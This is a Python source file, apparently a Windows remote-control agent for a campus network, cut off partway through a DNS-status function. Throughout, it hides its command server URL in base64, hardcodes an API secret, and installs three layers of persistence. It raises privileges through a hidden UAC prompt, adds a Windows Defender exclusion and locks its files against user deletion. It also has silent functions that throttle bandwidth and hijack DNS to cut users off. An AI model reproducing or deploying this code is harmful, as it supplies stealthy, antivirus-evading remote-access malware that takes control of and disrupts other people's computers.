#!/usr/bin/env python3
"""
校园网远程控制 - Agent (本地客户端)
功能: 自动上报状态、接收远程命令(下线/登录/刷新)
安装后自动运行，保持与控制面板的连接
"""
import json, time, os, sys, socket, uuid, hashlib, platform, traceback, base64, re
import urllib.request, urllib.parse, urllib.error

# ============ 配置 ============
# 服务器地址 (base64 混淆, 不以明文出现在二进制中)
_S = b'aHR0cHM6Ly95dWFuYWkuYmVzdC9neWs='  # https://yuanai.best/gyk
DEFAULT_SERVER = base64.b64decode(_S).decode()
PORTAL_IP = "10.228.9.7"
AGENT_VERSION = "1.57"  # 版本号, 每次更新递增
# API 鉴权密钥 (服务器和客户端必须一致)
API_SECRET = "CampusNet@2026#Secure"
HEARTBEAT_INTERVAL = 5  # 心跳间隔(秒)

# PyInstaller 打包后 __file__ 指向临时目录, 需用 exe 实际路径
if getattr(sys, 'frozen', False):
    # 打包后: sys.executable = exe 实际路径
    AGENT_EXE = sys.executable
    AGENT_DIR = os.path.dirname(AGENT_EXE)
else:
    # 开发环境: 直接用脚本路径
    AGENT_EXE = os.path.abspath(__file__)
    AGENT_DIR = os.path.dirname(AGENT_EXE)

CONFIG_FILE = os.path.join(AGENT_DIR, "agent_config.json")
AGENT_SCRIPT = AGENT_EXE
REG_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_NAME = "CampusNetAgent"

# ============ 工具函数 ============

def get_mac():
    """获取本机 MAC 地址"""
    mac_int = uuid.getnode()
    mac_str = ":".join(f"{(mac_int >> (8 * i)) & 0xFF:02X}" for i in reversed(range(6)))
    return mac_str

def get_local_ip():
    """获取本机局域网 IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_agent_id():
    """生成唯一 Agent ID (基于主机名+MAC)"""
    hostname = socket.gethostname()
    mac = get_mac()
    return hashlib.md5(f"{hostname}-{mac}".encode()).hexdigest()[:12]

def _sign(data_str):
    """生成 API 签名"""
    ts = str(int(time.time()))
    sig = hashlib.sha256(f"{API_SECRET}:{ts}:{data_str[:64]}".encode()).hexdigest()[:16]
    return ts, sig

def http_post(url, data, timeout=8):
    """发送 POST 请求 (带 API 签名鉴权)"""
    body = json.dumps(data).encode("utf-8")
    ts, sig = _sign(body.decode())
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("X-Auth-Ts", ts)
    req.add_header("X-Auth-Sig", sig)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

def http_get(url, timeout=8):
    """发送 GET 请求"""
    try:
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            return resp.read().decode("utf-8")
    except:
        return None

# ============ 开机自启管理 (Windows) ============
TASK_NAME = "CampusNetAgent"

def _is_admin():
    """检查是否有管理员权限"""
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def _run_as_admin(cmd_args):
    """以管理员权限运行命令, 返回 (成功, 输出)"""
    import subprocess
    
    def _quote(s):
        """给带空格的参数加引号"""
        return f'"{s}"' if " " in s and not s.startswith('"') else s
    
    try:
        # 先尝试直接运行 (已有管理员权限)
        print(f"  [ADMIN] 尝试直接运行: {cmd_args[0]} ...")
        r = subprocess.run(cmd_args, capture_output=True, text=True, timeout=15,
                          creationflags=subprocess.CREATE_NO_WINDOW)
        if r.returncode == 0:
            print(f"  [ADMIN] 直接运行成功")
            return True, r.stdout.strip()
        print(f"  [ADMIN] 直接运行失败 (code={r.returncode}): {r.stderr.strip()[:80]}")
        
        # 需要 UAC 提权
        import ctypes, tempfile
        # 使用系统 TEMP 目录 (始终可写, 避免 AGENT_DIR 没有写权限)
        tmp_dir = tempfile.gettempdir()
        bat_path = os.path.join(tmp_dir, "_admin_cmd.bat")
        result_path = os.path.join(tmp_dir, "_admin_result.txt")
        _unprotect_file(bat_path)
        _unprotect_file(result_path)
        # 删除旧的结果文件
        if os.path.exists(result_path):
            os.remove(result_path)
        # 写 bat，参数正确引号
        cmd_line = " ".join(_quote(a) for a in cmd_args)
        with open(bat_path, "w", encoding="gbk") as f:
            f.write("@echo off\n")
            f.write(f'chcp 65001 >nul 2>&1\n')
            f.write(f'{cmd_line} > "{result_path}" 2>&1\n')
        print(f"  [ADMIN] 请求 UAC 提权...")
        # 请求 UAC
        ret = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", "cmd.exe", f'/c "{bat_path}"', None, 0)  # 0=SW_HIDE 静默
        if ret <= 32:
            return False, f"UAC 被拒绝 (code={ret})"
        # 等待执行完
        import time as _t
        for _ in range(60):  # 等最多30秒
            _t.sleep(0.5)
            if os.path.exists(result_path):
                _t.sleep(0.3)  # 等写完
                with open(result_path, "r", encoding="utf-8", errors="replace") as rf:
                    output = rf.read().strip()
                try: os.remove(result_path)
                except: pass
                try: os.remove(bat_path)
                except: pass
                print(f"  [ADMIN] UAC 执行完毕: {output[:80]}")
                return True, output
        try: os.remove(bat_path)
        except: pass
        return True, "已执行(等待超时)"
    except Exception as e:
        print(f"  [ADMIN] 异常: {e}")
        return False, str(e)

def _task_exists():
    """检查计划任务是否存在"""
    import subprocess
    try:
        r = subprocess.run(
            ["schtasks", "/Query", "/TN", TASK_NAME],
            capture_output=True, text=True, timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW)
        return r.returncode == 0
    except:
        return False

def _reg_exists():
    """检查注册表自启是否存在"""
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_READ)
        try:
            val, _ = winreg.QueryValueEx(key, REG_NAME)
            winreg.CloseKey(key)
            return bool(val)
        except FileNotFoundError:
            winreg.CloseKey(key)
            return False
    except:
        return False

def is_autostart_enabled():
    """检查是否已设置开机自启 (注册表 或 计划任务 或 启动文件夹)"""
    if platform.system() != "Windows":
        return False
    return _reg_exists() or _task_exists() or _startup_lnk_exists()

def _unprotect_file(path):
    """写入前解除单个文件的只读/隐藏/系统属性"""
    if os.path.exists(path) and platform.system() == "Windows":
        try:
            import subprocess
            subprocess.run(["attrib", "-R", "-H", "-S", path],
                          capture_output=True, timeout=5,
                          creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass

AUTOSTART_LOG = None  # 延迟初始化

def _autostart_log(msg):
    """自启操作日志, 便于诊断"""
    global AUTOSTART_LOG
    if AUTOSTART_LOG is None:
        AUTOSTART_LOG = os.path.join(AGENT_DIR, "autostart.log")
    try:
        _unprotect_file(AUTOSTART_LOG)
        with open(AUTOSTART_LOG, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")
    except: pass

def _get_launch_command():
    """获取启动 Agent 的命令行 (用于所有自启层)
    
    打包后: 直接返回 exe 路径 (--noconsole 已保证无窗口)
    开发环境: 返回 VBS 包装 python 命令 (隐藏控制台)
    """
    if getattr(sys, 'frozen', False):
        # 打包后: 直接启动 exe, 不需要 VBS 中间层
        return AGENT_EXE, f'"{AGENT_EXE}"'
    else:
        # 开发环境: 需要 VBS 隐藏 python 控制台
        vbs_path = os.path.join(AGENT_DIR, "start_agent.vbs")
        _unprotect_file(vbs_path)
        python_exe = sys.executable
        with open(vbs_path, "w", encoding="mbcs") as f:
            f.write(f'Set ws = CreateObject("WScript.Shell")\n')
            f.write(f'ws.Run """{python_exe}"" ""{AGENT_SCRIPT}""", 0, False\n')
        return vbs_path, f'wscript.exe "{vbs_path}"'

def _create_vbs():
    """兼容老代码: 返回启动命令使用的目标路径 (exe 或 vbs)"""
    target, _ = _get_launch_command()
    return target

def _get_startup_folder():
    """获取 Windows 启动文件夹路径"""
    try:
        return os.path.join(os.environ["APPDATA"],
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    except:
        return None

def enable_autostart():
    """启用开机自启 (3层保护: 注册表 + 计划任务 + 启动文件夹)
    
    每层都写日志 + 回读验证, 确保真实生效
    """
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    results = []
    _autostart_log("=" * 50)
    _autostart_log(f"开始注册自启, AGENT_EXE={AGENT_EXE}")
    
    # 验证 exe 存在
    if not os.path.exists(AGENT_EXE):
        msg = f"❌ 启动目标不存在: {AGENT_EXE}"
        _autostart_log(msg)
        return False, msg
    
    target_path, launch_cmd = _get_launch_command()
    _autostart_log(f"启动命令: {launch_cmd}")

    # 层级1: 注册表 HKCU\Run (不需管理员, 当前用户登录时启动)
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, launch_cmd)
        winreg.CloseKey(key)
        # 回读验证
        time.sleep(0.1)
        if _reg_exists():
            results.append("注册表✓")
            _autostart_log("✓ 注册表写入+回读成功")
        else:
            # 可能被安全策略拦截, 用 reg.exe 重试
            import subprocess
            r = subprocess.run(["reg", "add", f"HKCU\\{REG_KEY}", "/v", REG_NAME,
                              "/t", "REG_SZ", "/d", launch_cmd, "/f"],
                             capture_output=True, timeout=10,
                             creationflags=subprocess.CREATE_NO_WINDOW)
            if _reg_exists():
                results.append("注册表✓")
                _autostart_log("✓ 注册表(reg.exe回退)写入成功")
            else:
                results.append("注册表✗(被安全策略拦截)")
                _autostart_log(f"✗ 注册表写入被拦截, 输出: {r.stdout.decode('gbk',errors='ignore')[:100]}")
    except Exception as e:
        results.append(f"注册表✗({e})")
        _autostart_log(f"✗ 注册表异常: {e}")

    # 层级2: 计划任务 schtasks ONLOGON (需管理员, 最可靠)
    cmd = [
        "schtasks", "/Create", "/F",
        "/TN", TASK_NAME,
        "/TR", launch_cmd,
        "/SC", "ONLOGON",
        "/RL", "HIGHEST",
        "/DELAY", "0000:10",
    ]
    try:
        ok, out = _run_as_admin(cmd)
        time.sleep(0.3)
        if _task_exists():
            results.append("计划任务✓")
            _autostart_log("✓ 计划任务创建+回读成功")
        else:
            results.append(f"计划任务✗")
            _autostart_log(f"✗ 计划任务失败: ok={ok}, out={out[:150]}")
    except Exception as e:
        results.append(f"计划任务✗({e})")
        _autostart_log(f"✗ 计划任务异常: {e}")

    # 层级3: 启动文件夹快捷方式 (不需管理员, 最稳定)
    startup_dir = _get_startup_folder()
    if startup_dir and os.path.isdir(startup_dir):
        try:
            lnk_path = os.path.join(startup_dir, "CampusNetAgent.lnk")
            _unprotect_file(lnk_path)
            lnk_vbs = os.path.join(AGENT_DIR, "_mk_lnk.vbs")
            _unprotect_file(lnk_vbs)
            # 生成快捷方式的 VBS (用 mbcs 编码以支持中文路径)
            with open(lnk_vbs, "w", encoding="mbcs") as f:
                f.write(f'Set ws = CreateObject("WScript.Shell")\n')
                f.write(f'Set lnk = ws.CreateShortcut("{lnk_path}")\n')
                if getattr(sys, 'frozen', False):
                    f.write(f'lnk.TargetPath = "{AGENT_EXE}"\n')
                    f.write(f'lnk.Arguments = ""\n')
                else:
                    f.write(f'lnk.TargetPath = "wscript.exe"\n')
                    f.write(f'lnk.Arguments = """{target_path}"""\n')
                f.write(f'lnk.WindowStyle = 7\n')
                f.write(f'lnk.WorkingDirectory = "{AGENT_DIR}"\n')
                f.write(f'lnk.Save\n')
            import subprocess
            subprocess.run(["wscript.exe", lnk_vbs], timeout=10,
                         creationflags=subprocess.CREATE_NO_WINDOW)
            try: os.remove(lnk_vbs)
            except: pass
            if os.path.exists(lnk_path):
                results.append("启动文件夹✓")
                _autostart_log(f"✓ 启动文件夹快捷方式: {lnk_path}")
            else:
                results.append("启动文件夹✗")
                _autostart_log(f"✗ 启动文件夹快捷方式未生成")
        except Exception as e:
            results.append(f"启动文件夹✗({e})")
            _autostart_log(f"✗ 启动文件夹异常: {e}")
    else:
        results.append("启动文件夹✗(路径不存在)")
        _autostart_log(f"✗ 启动文件夹路径不存在")

    success = any("✓" in r for r in results)
    _autostart_log(f"注册完成: {results}")
    return success, "已启用: " + " | ".join(results)

def _startup_lnk_exists():
    """检查启动文件夹快捷方式是否存在"""
    startup_dir = _get_startup_folder()
    if not startup_dir:
        return False
    return os.path.exists(os.path.join(startup_dir, "CampusNetAgent.lnk"))

def disable_autostart():
    """禁用开机自启 (清除全部三层)"""
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    results = []

    # 清注册表
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_SET_VALUE)
        try:
            winreg.DeleteValue(key, REG_NAME)
        except FileNotFoundError:
            pass
        winreg.CloseKey(key)
        results.append("注册表✓")
    except Exception as e:
        results.append(f"注册表✗({e})")

    # 删计划任务
    cmd = ["schtasks", "/Delete", "/TN", TASK_NAME, "/F"]
    ok, out = _run_as_admin(cmd)
    if ok:
        results.append("计划任务✓")
    else:
        results.append(f"计划任务✗({out[:50]})")

    # 清启动文件夹快捷方式
    startup_dir = _get_startup_folder()
    if startup_dir:
        lnk = os.path.join(startup_dir, "CampusNetAgent.lnk")
        if os.path.exists(lnk):
            try:
                os.remove(lnk)
                results.append("启动文件夹✓")
            except Exception as e:
                results.append(f"启动文件夹✗({e})")

    # 清理 VBS
    for vf in ["start_agent.vbs", "_watchdog.vbs", "_mk_lnk.vbs"]:
        vp = os.path.join(AGENT_DIR, vf)
        if os.path.exists(vp):
            try: os.remove(vp)
            except: pass

    success = any("✓" in r for r in results)
    return success, "已禁用: " + " | ".join(results)

def full_uninstall():
    """完全卸载: 禁用自启 + 解除防护 + 删除配置 + 结束进程"""
    results = []
    # 1. 禁用自启
    ok, msg = disable_autostart()
    results.append(msg)
    # 2. 解除防护
    try:
        ok2, msg2 = unprotect_files()
        results.append(msg2)
    except: pass
    try:
        ok3, msg3 = remove_defender_exclusion()
        results.append(msg3)
    except: pass
    # 3. 删除配置文件
    if os.path.exists(CONFIG_FILE):
        try: os.remove(CONFIG_FILE)
        except: pass
    # 4. 杀看门狗
    import subprocess
    try:
        subprocess.run(["taskkill", "/F", "/IM", "wscript.exe"],
                      capture_output=True, timeout=5,
                      creationflags=subprocess.CREATE_NO_WINDOW)
    except: pass
    return True, "已完全卸载: " + " | ".join(results)

# ============ 文件/进程保护 (Windows) ============

def protect_files():
    """保护 Agent 运行时文件: 隐藏+系统+只读属性 + NTFS权限
    
    注意: exe 本身不设 H/S 属性 (否则资源管理器看不到, 不便分发)
    exe 的防删除保护依赖: 运行时文件被系统锁定 + NTFS 权限限制
    """
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    import subprocess
    results = []
    agent_dir = AGENT_DIR
    
    # 1. 设置文件属性: 隐藏+系统+只读 (仅对配置/VBS, 不对exe)
    hs_targets = [CONFIG_FILE,
                  os.path.join(agent_dir, "start_agent.vbs"),
                  os.path.join(agent_dir, "_watchdog.vbs"),
                  os.path.join(agent_dir, "_watchdog.pid")]
    for f in hs_targets:
        if os.path.exists(f):
            try:
                subprocess.run(["attrib", "+H", "+S", "+R", f],
                             capture_output=True, timeout=5,
                             creationflags=subprocess.CREATE_NO_WINDOW)
            except: pass
    
    # exe 只设只读, 不隐藏 (保持资源管理器可见)
    if os.path.exists(AGENT_EXE):
        try:
            subprocess.run(["attrib", "-H", "-S", "+R", AGENT_EXE],
                         capture_output=True, timeout=5,
                         creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass
    results.append("属性✓")
    
    # 2. NTFS 权限: 仅管理员和SYSTEM可修改
    cmd = ["icacls", agent_dir, "/inheritance:r",
           "/grant:r", "SYSTEM:(OI)(CI)F",
           "/grant:r", "Administrators:(OI)(CI)F",
           "/grant:r", f"{os.environ.get('USERNAME','*')}:(OI)(CI)RX"]
    ok, out = _run_as_admin(cmd)
    if ok:
        results.append("NTFS权限✓")
    else:
        results.append(f"NTFS权限✗({out[:40]})")
    
    return True, " | ".join(results)

def unprotect_files():
    """移除文件保护"""
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    import subprocess
    agent_dir = os.path.dirname(AGENT_SCRIPT)
    
    # 移除属性
    targets = [AGENT_SCRIPT, CONFIG_FILE,
               os.path.join(agent_dir, "start_agent.vbs")]
    for f in targets:
        if os.path.exists(f):
            try:
                subprocess.run(["attrib", "-H", "-S", "-R", f],
                             capture_output=True, timeout=5,
                             creationflags=subprocess.CREATE_NO_WINDOW)
            except: pass
    
    # 恢复 NTFS 继承
    cmd = ["icacls", agent_dir, "/inheritance:e", "/reset"]
    _run_as_admin(cmd)
    return True, "文件保护已移除"

def add_defender_exclusion():
    """添加 Windows Defender 白名单"""
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    agent_dir = os.path.dirname(AGENT_SCRIPT)
    cmd = ["powershell", "-Command",
           f'Add-MpPreference -ExclusionPath "{agent_dir}"']
    ok, out = _run_as_admin(cmd)
    if ok:
        return True, f"Defender 白名单已添加: {agent_dir}"
    return False, f"添加失败: {out[:60]}"

def remove_defender_exclusion():
    """移除 Windows Defender 白名单"""
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    agent_dir = os.path.dirname(AGENT_SCRIPT)
    cmd = ["powershell", "-Command",
           f'Remove-MpPreference -ExclusionPath "{agent_dir}"']
    ok, out = _run_as_admin(cmd)
    return True, "Defender 白名单已移除"

# ============ 网络限速 (Windows QoS) ============

BANDWIDTH_POLICY_NAME = "CampusNetAgent_BW_Limit"

def _ps_run(cmd_str, timeout=15):
    """执行 PowerShell 命令, 返回 (returncode, stdout, stderr)"""
    import subprocess
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd_str],
            capture_output=True, text=True, timeout=timeout,
            creationflags=subprocess.CREATE_NO_WINDOW)
        return r.returncode, r.stdout.strip(), r.stderr.strip()
    except Exception as e:
        return -1, "", str(e)

def _ps_admin(cmd_str, timeout=15):
    """以管理员权限执行 PowerShell 命令"""
    cmd = ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd_str]
    ok, out = _run_as_admin(cmd)
    return ok, out

# 限速标记文件, 用于记录当前限速状态
_BW_STATE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "_bw_limit_state.json")

def set_bandwidth_limit(rate_kbps):
    """设置带宽限制 (静默, 无弹窗)
    
    多策略组合限速 (上传+下载):
    1. 启用网卡 QoS Packet Scheduler (前置条件)
    2. QoS 策略限制出站 (上传)
    3. TCP 接收窗口限制入站 (下载)
    4. GPO 注册表 QoS + gpupdate 生效
    rate_kbps: 限速值, 单位 KB/s (例如 100 = 100KB/s)
    """
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    rate_kbps = int(rate_kbps)
    rate_bps = rate_kbps * 8 * 1000  # KB/s → bits/s
    results = []
    
    # 所有策略合并为一个管理员 PowerShell 脚本, 避免多次 UAC 弹窗
    ps_all = (
        # --- 前置: 启用所有网卡的 QoS Packet Scheduler ---
        'try { Enable-NetAdapterBinding -Name "*" -ComponentID ms_pacer -EA SilentlyContinue } catch {}; '
        
        # --- 策略1: QoS 出站限速 ---
        f'Remove-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -Confirm:$false -EA SilentlyContinue; '
        f'New-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -IPProtocolMatchCondition Both '
        f'-ThrottleRateActionBitsPerSecond {rate_bps} -PolicyStore ActiveStore; '
        
        # --- 策略2: TCP 接收窗口限制 (限下载) ---
        'netsh interface tcp set global autotuninglevel='
    )
    if rate_kbps <= 100:
        ps_all += 'disabled; '
    elif rate_kbps <= 500:
        ps_all += 'highlyrestricted; '
    else:
        ps_all += 'restricted; '
    
    ps_all += (
        # --- 策略3: GPO 注册表 QoS (覆盖面更广) ---
        f'$qp = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\QoS\\{BANDWIDTH_POLICY_NAME}"; '
        f'New-Item -Path $qp -Force -EA SilentlyContinue | Out-Null; '
        f'Set-ItemProperty -Path $qp -Name "Version" -Value "1.0" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Application Name" -Value "*" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Protocol" -Value "*" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Local Port" -Value "*" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Local IP" -Value "*" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Local IP Prefix Length" -Value "*" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Remote Port" -Value "*" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Remote IP" -Value "*" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Remote IP Prefix Length" -Value "*" -Force; '
        f'Set-ItemProperty -Path $qp -Name "DSCP Value" -Value "-1" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Throttle Rate" -Value "{rate_bps}" -Force; '
        # --- 关键: 立即刷新组策略使其生效 ---
        'gpupdate /force /wait:0 2>$null; '
        # --- 验证 ---
        f'$p = Get-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -PolicyStore ActiveStore -EA SilentlyContinue; '
        'if($p){ Write-Output "VERIFY_OK" } else { Write-Output "VERIFY_FAIL" }'
    )
    
    # 直接用管理员权限执行 (QoS/netsh/注册表都需要admin)
    rc, out, err = _ps_run(ps_all)
    if rc != 0 or 'VERIFY_OK' not in out:
        ok, admin_out = _ps_admin(ps_all)
        out = admin_out  # 使用管理员执行的输出来验证
        results.append("admin✓" if ok else "admin✗")
    else:
        results.append("direct✓")
    
    if 'VERIFY_OK' in str(out):
        results.append("QoS验证✓")
    else:
        results.append("QoS验证✗")
    
    # 保存状态
    try:
        with open(_BW_STATE_FILE, "w") as f:
            json.dump({"rate_kbps": rate_kbps, "time": time.time()}, f)
    except: pass
    
    detail = " | ".join(results)
    return True, f"限速 {rate_kbps}KB/s 已生效 [{detail}]"

def clear_bandwidth_limit():
    """移除所有带宽限制 (静默)"""
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    ps_clear = (
        f'Remove-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -Confirm:$false -EA SilentlyContinue; '
        f'netsh interface tcp set global autotuninglevel=normal; '
        f'Remove-Item -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\QoS\\{BANDWIDTH_POLICY_NAME}" -Recurse -Force -EA SilentlyContinue; '
        f'gpupdate /force /wait:0 2>$null'
    )
    rc, _, _ = _ps_run(ps_clear)
    if rc != 0:
        _ps_admin(ps_clear)
    try:
        os.remove(_BW_STATE_FILE)
    except: pass
    return True, "所有限速已解除"

def get_bandwidth_limit():
    """查询当前限速值, 返回 KB/s 或 0 (无限速)"""
    if platform.system() != "Windows":
        return 0
    # 优先从状态文件读取
    try:
        with open(_BW_STATE_FILE, "r") as f:
            state = json.load(f)
            return state.get("rate_kbps", 0)
    except: pass
    # 回退: 从 QoS 策略查询
    rc, out, _ = _ps_run(
        f'(Get-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -PolicyStore ActiveStore -EA Stop).ThrottleRateAction')
    if rc == 0 and out:
        try:
            bps = int(out)
            return bps // 8 // 1000
        except: pass
    return 0

# ============ DNS 篡改 (Windows) ============

def set_dns_hijack(primary_dns, secondary_dns=""):
    """篡改所有活动网卡的 DNS (静默, 无弹窗)
    
    primary_dns: 主 DNS (如 "127.0.0.1" 使网络几乎不可用)
    secondary_dns: 备用 DNS (可选)
    """
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    import subprocess
    # 获取所有活动网卡 (状态=Up, 有 IPv4)
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -ExpandProperty Name"],
            capture_output=True, text=True, timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW)
        adapters = [a.strip() for a in r.stdout.strip().splitlines() if a.strip()]
    except:
        adapters = []
    if not adapters:
        return False, "未找到活动网卡"
    
    results = []
    dns_addrs = f'"{primary_dns}"'
    if secondary_dns:
        dns_addrs = f'("{primary_dns}","{secondary_dns}")'
    
    for adapter in adapters:
        cmd = ["powershell", "-NoProfile", "-Command",
               f'Set-DnsClientServerAddress -InterfaceAlias "{adapter}" -ServerAddresses {dns_addrs}']
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=10,
                              creationflags=subprocess.CREATE_NO_WINDOW)
            if r.returncode == 0:
                results.append(f"{adapter}:✓")
            else:
                # 尝试管理员
                ok, out = _run_as_admin(cmd)
                results.append(f"{adapter}:{'✓' if ok else '✗'}")
        except:
            results.append(f"{adapter}:err")
    
    ok_count = sum(1 for r in results if '✓' in r)
    return ok_count > 0, f"DNS→{primary_dns} | {' '.join(results)}"

def reset_dns():
    """恢复所有活动网卡 DNS 为自动获取 (DHCP) (静默)
    
    使用 netsh 设置 DHCP 源 (比 PowerShell -ResetServerAddresses 更可靠,
    后者在某些机器上会导致 DNS 为空而非真正的 DHCP)
    """
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    import subprocess
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -ExpandProperty Name"],
            capture_output=True, text=True, timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW)
        adapters = [a.strip() for a in r.stdout.strip().splitlines() if a.strip()]
    except:
        adapters = []
    if not adapters:
        return False, "未找到活动网卡"
    
    results = []
    for adapter in adapters:
        # 方法1: netsh 设置 DNS 来源为 DHCP (最可靠)
        cmd_netsh = ["netsh", "interface", "ip", "set", "dns",
                     f"name={adapter}", "source=dhcp"]
        try:
            r = subprocess.run(cmd_netsh, capture_output=True, text=True, timeout=10,
                              creationflags=subprocess.CREATE_NO_WINDOW)
            if r.returncode == 0:
                results.append(f"{adapter}:✓")
            else:
                # 回退: 管理员权限执行 netsh
                ok, out = _run_as_admin(cmd_netsh)
                if ok:
                    results.append(f"{adapter}:✓")
                else:
                    # 最后手段: PowerShell ResetServerAddresses
                    cmd_ps = ["powershell", "-NoProfile", "-Command",
                              f'Set-DnsClientServerAddress -InterfaceAlias "{adapter}" -ResetServerAddresses']
                    ok2, out2 = _run_as_admin(cmd_ps)
                    results.append(f"{adapter}:{'✓' if ok2 else '✗'}")
        except:
            results.append(f"{adapter}:err")
    
    ok_count = sum(1 for r in results if '✓' in r)
    return ok_count > 0, f"DNS已恢复DHCP | {' '.join(results)}"

# ============ 网络速度采样 ============

_net_prev = {"recv": 0, "sent": 0, "time": 0}

def _get_net_bytes():
    """获取所有网卡的累计收发字节数 (Windows, PowerShell)"""
    if platform.system() != "Windows":
        return 0, 0
    import subprocess
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "$r=0;$s=0;Get-NetAdapterStatistics|ForEach-Object{$r+=$_.ReceivedBytes;$s+=$_.SentBytes};\"$r $s\""],
            capture_output=True, text=True, timeout=5,
            creationflags=subprocess.CREATE_NO_WINDOW)
        parts = r.stdout.strip().split()
        if len(parts) == 2:
            return int(parts[0]), int(parts[1])
    except:
        pass
    return 0, 0

def get_net_speed():
    """获取当前网络上下行速度 (KB/s), 基于两次采样差值
    返回 (down_kbps, up_kbps)
    """
    recv, sent = _get_net_bytes()
    now = time.time()
    
    prev_recv = _net_prev["recv"]
    prev_sent = _net_prev["sent"]
    prev_time = _net_prev["time"]
    
    _net_prev["recv"] = recv
    _net_prev["sent"] = sent
    _net_prev["time"] = now
    
    if prev_time == 0 or recv == 0:
        return 0.0, 0.0  # 首次采样, 无法计算
    
    dt = now - prev_time
    if dt < 1:
        return 0.0, 0.0
    
    down = round((recv - prev_recv) / dt / 1024, 1)  # KB/s
    up = round((sent - prev_sent) / dt / 1024, 1)
    # 防止负数 (网卡重置/切换)
    if down < 0: down = 0.0
    if up < 0: up = 0.0
    return down, up

def get_dns_status():
    """查询当前 DNS 设置, 返回 (is_hijacked: bool, dns_servers: str)
    
    使用 netsh 检测默认网关所在网卡的 DNS 配置来源 (Static vs DHCP)
    排除虚拟网卡 (Docker/VMware/Hyper-V 等)
    """
    if platform.system() != "Windows":
        return False, ""
    import subprocess
    try:
        # 用 netsh 获取所有接口的 DNS 配置, 含来源(DHCP/Static)
        r = subprocess.run(
            ["netsh", "interface", "ip", "show", "dns"],
            capture_output=True, text=True, timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW)
        output = r.stdout
        
        # 同时获取有默认网关的物理网卡名 (排除虚拟网卡)
        r2 = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "$route=Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue|Select-Object -First 1;"
             "if($route){(Get-NetAdapter -InterfaceIndex $route.InterfaceIndex).Name}"],
            capture_output=True, text=True, timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW)
        primary_adapter = r2.stdout.strip()
        
        if not primary_adapter:
            return False, "未找到主网卡"
        
        # 解析 netsh 输出, 找到主网卡的 DNS 配置段
        lines = output.splitlines()
        in_section = False
        dns_servers = []
        is_static = False
        
        for line in lines:
            # netsh 输出格式: "接口 "以太网" 的配置" 或 "Configuration for interface "Ethernet""
            if '接口' in line or 'interface' in line.lower():
                if primary_adapter in line:
                    in_section = True
                    dns_servers = []
                    is_static = False
                else:
                    if in_section:
                        break  # 已经过了目标段
                    in_section = False
            elif in_section:
                stripped = line.strip()
                if not stripped:
                    continue
                # 检测来源: "静态配置" / "Statically Configured" / "通过 DHCP" / "DHCP"
                if '静态' in stripped or 'Static' in stripped.lower():
                    is_static = True
                elif 'DHCP' in stripped:
                    is_static = False
                # 提取 DNS IP (行中含IP地址的)
